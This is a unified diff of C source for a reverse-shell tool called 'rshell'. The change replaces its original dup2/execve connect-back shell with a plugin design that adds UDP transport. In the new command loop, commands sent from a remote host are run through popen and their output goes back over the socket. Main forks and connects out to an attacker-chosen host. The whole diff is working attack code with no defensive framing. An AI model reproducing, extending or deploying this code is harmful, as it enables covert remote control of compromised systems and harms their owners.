@@ -12,6 +12,10 @@
 #define PATHSHELL	PATH "/" SHELL
 
 #include "common.h"
+#include "plugin.h"
+#include "plain_tcp.h"
+#include "plain_udp.h"
+#include "popen.h"
 
 
 #define RSHELL_F_NOFORK	(1 << 0)
@@ -24,6 +28,7 @@ struct rshell
 	int		family;
 	char		*shell;
 	unsigned	flags;
+	struct plugin	*plugin;
 };
 
 
@@ -37,87 +42,66 @@ static void usage(void)
 	fprintf(stderr, "\t-4         : use IPv4 socket\n");
 	fprintf(stderr, "\t-6         : use IPv6 socket\n");
 	fprintf(stderr, "\t-s <shell> : give the path shell (default: %s)\n", PATHSHELL);
+	fprintf(stderr, "\t-u         : use an UDP socket\n");
 }
 
 
-static char *rshell_basename(char *path)
+static int command(const struct rshell *rshell, int sockfd)
 {
-	char		*ptr;
-	size_t		len = strlen(path);
+	struct sockaddr_storage	storage;
+	struct sockaddr		*peeraddr = (struct sockaddr *) &storage;
+	socklen_t		addrlen = sizeof(struct sockaddr_storage);
+	ssize_t			len;
+	FILE			*fp;
+	char			*cmd;
 
-	for ( ptr = path + len ; ptr >= path ; ptr--)
+	while ( 1 )
 	{
-		if ( ptr[0] == '/' )
-			return ++ptr;
-	}
+		char	buf[CMD_BUFFER_LEN] = {0};
 
-	return path;
-}
+		if ( (len = rshell->plugin->recv(sockfd, buf, sizeof(buf) - sizeof(" 2>&1"), 0, peeraddr, &addrlen)) <= 0 )
+			return -1;
 
+		cmd = trim(buf, &len);
 
-static void reverse_tcp(const struct rshell *rshell)
-{
-	int		sockfd;
-	struct addrinfo	hints,
-			*result,
-			*rp;
-	int		ret;
-	char		*ex[3];
-
-	memset(&hints, 0, sizeof hints);
-	hints.ai_family = rshell->family;
-	hints.ai_socktype = SOCK_STREAM;
-
-	if ( (ret = getaddrinfo(rshell->host, rshell->service, &hints, &result)) != 0 )
-	{
-		fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(ret));
-		return;
-	}
-
-	/* getaddrinfo() returns a list of address structures.
-	 * Try each address until we successfully bind().
-	 */
-	for ( rp = result ; rp != NULL ; rp = rp->ai_next )
-	{
-		if ( (sockfd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol)) < 0 )
+		if ( ! len )
 			continue;
 
-		if ( connect(sockfd, rp->ai_addr, rp->ai_addrlen) == 0 )
-			break;
+		strncat(cmd, " 2>&1", sizeof(buf));
 
-		close(sockfd);
+		if ( (fp = popen_shell(rshell->shell, cmd, "r")) == NULL )
+			continue;
+
+		while ( (len = fread(buf, 1, sizeof(buf), fp)) > 0 )
+			rshell->plugin->send(sockfd, buf, len, 0, peeraddr, addrlen);
+
+		pclose_shell(fp);
 	}
 
-	freeaddrinfo(result);
+	return 0;
+}
 
-	if ( rp == NULL )
-	{
-		fprintf(stderr, "Could not bind any socket.\n");
+
+static void reverse_shell(const struct rshell *rshell)
+{
+	int		sockfd;
+	struct addrinfo	hints = {0};
+
+	hints.ai_family = rshell->family;
+
+	if ( (sockfd = rshell->plugin->connect(&hints, rshell->host, rshell->service)) < 0 )
 		return;
-	}
 
-	/* Replace stdin, stdout and stderr from the socket
-	 */
-	dup2(sockfd, 0);
-	dup2(sockfd, 1);
-	dup2(sockfd, 2);
-
-	ex[0] = rshell->shell;
-	ex[1] = rshell_basename(rshell->shell);
-	ex[2] = NULL;
-
-	execve(ex[0], &ex[1], NULL);
-
-	/* Should never get here
-	 */
+	command(rshell, sockfd);
 }
 
 
 static void rshell_init(struct rshell *rshell)
 {
-	rshell->family = AF_UNSPEC;
-	rshell->shell = PATHSHELL;
-	rshell->flags = 0;
+	rshell->family	= AF_UNSPEC;
+	rshell->shell	= PATHSHELL;
+	rshell->flags	= 0;
+	rshell->plugin	= &plain_tcp_plugin;
 }
 
 
@@ -145,7 +129,7 @@ int main(int argc, char *argv[])
 
 	rshell_init(&rshell);
 
-	while ( (c = getopt(argc, argv, "46fhs:v")) != -1 )
+	while ( (c = getopt(argc, argv, "46fhs:uv")) != -1 )
 	{
 		switch ( c )
 		{
@@ -167,6 +151,10 @@ int main(int argc, char *argv[])
 
 			case 's':
 			rshell.shell = optarg;
+			break;
+
+			case 'u':
+			rshell.plugin = &plain_udp_plugin;
 			break;
 
 			case 'v':
@@ -194,7 +182,7 @@ int main(int argc, char *argv[])
 	/* Fork and connect back
 	 */
 	if ( (rshell.flags & RSHELL_F_NOFORK) || (child = fork()) == 0 )
-		reverse_tcp(&rshell);
+		reverse_shell(&rshell);
 	else
 		printf("child pid: %d\n", child);
 
